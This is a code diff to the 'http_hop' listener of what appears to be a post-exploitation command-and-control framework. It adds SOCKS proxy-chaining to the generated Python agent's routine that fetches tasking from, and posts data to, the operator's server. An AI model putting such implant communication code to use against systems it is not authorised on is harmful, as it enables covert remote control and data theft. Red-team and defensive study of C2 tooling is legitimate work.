@@ -415,6 +415,11 @@ class Listener(object):
 
                 updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])
 
+                # Import sockschain code
+                f = open(self.mainMenu.installPath + "/data/agent/stagers/common/sockschain.py")
+                socks_import = f.read()
+                f.close()
+
                 sendMessage = f"""
 def send_message(packets=None):
     # Requests a tasking or posts data to a randomized tasking URI.
@@ -441,6 +446,7 @@ def send_message(packets=None):
     requestUri = server + taskURI
 
     try:
+        wrapmodule(urllib.request)
         data = (urllib.request.urlopen(urllib.request.Request(requestUri, data, headers))).read()
         return ('200', data)
 
@@ -459,7 +465,7 @@ def send_message(packets=None):
         return (URLerror.reason, '')
     return ('', '')
 """
-                return updateServers + sendMessage
+                return socks_import + updateServers + sendMessage
 
             else:
                 print(helpers.color("[!] listeners/http_hop generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."))
